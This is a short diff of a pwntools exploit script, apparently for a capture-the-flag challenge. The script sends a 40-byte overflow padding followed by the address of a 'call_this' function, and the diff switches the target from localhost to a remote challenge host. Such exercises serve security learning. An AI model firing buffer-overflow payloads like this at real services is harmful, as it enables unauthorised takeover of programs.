@@ -4,7 +4,7 @@ from pwn import *
 
 payload = b'a' * 40 + p64(ELF("./challenge").symbols.call_this)
 
-p = remote("localhost", 1001) # process("./challenge")
+p = remote("poctf-beta.poc-innovation.com", 1001) # process("./challenge")
 
 p.sendline(payload)
 
